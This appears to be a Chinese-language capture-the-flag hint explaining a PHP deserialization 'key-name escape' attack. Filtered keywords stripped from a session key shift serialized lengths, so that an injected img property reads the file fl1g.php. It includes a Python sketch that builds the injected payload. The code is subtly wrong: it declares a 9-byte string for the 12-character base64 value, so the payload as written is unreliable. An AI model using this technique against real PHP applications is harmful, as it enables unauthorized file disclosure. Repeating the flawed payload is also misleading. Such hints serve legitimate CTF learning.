# 重要提示 - 反序列化逃逸方法

你一直在尝试**值逃逸**（在user值中注入），但正确的方法是**键名逃逸**。

## 关键区别

值逃逸：`_SESSION[user]=flagflag...inject` — 这要求inject后面还有原始属性被"吃掉"
键名逃逸：利用**键名**中的过滤关键词被删除来逃逸

## 正确方法

通过 POST `_SESSION[flagphp]=xxx` 添加一个新的 SESSION 键：
- 键名 `flagphp` 包含 `flag` 和 `php`（都会被 filter 删除）
- 序列化后：`s:7:"flagphp";s:N:"xxx";`
- filter 后：`s:7:"";s:N:"xxx";`
- 键名长度 7 但实际为空，反序列化时向后多读 7 个字符

## 构造 payload

你需要让键名中的过滤字符收缩后，恰好能"吃掉"值部分的分隔符，并注入一个新的 img 属性。

具体来说：
- 用足够多的过滤关键词构造键名（如 `flagflagflagflag`）
- 值设为你想注入的序列化 payload
- filter 删除键名中的关键词后，多出的长度会消费值的前面部分

## 目标文件

flag 在 `fl1g.php`（注意是数字 1 不是字母 l），base64 编码后作为 img 属性的值。
`base64_encode("fl1g.php")` = `ZmwxZy5waHA=`

## 参考代码思路

```python
import base64
target = "fl1g.php"
target_b64 = base64.b64encode(target.encode()).decode()  # ZmwxZy5waHA=

# 利用键名中的 "flag" (4字节) 被替换为空来逃逸
# 注入 payload: ";s:3:"img";s:9:"ZmwxZy5waHA=";}
# 这个 payload 需要被键名收缩"吃掉"的长度覆盖

inject = '";s:3:"img";s:9:"' + target_b64 + '";}'

# 键名需要包含足够的过滤关键词
# 每个 "flag" 收缩 4 字节
# 键名 = "flag" * (len(inject) // 4)
```
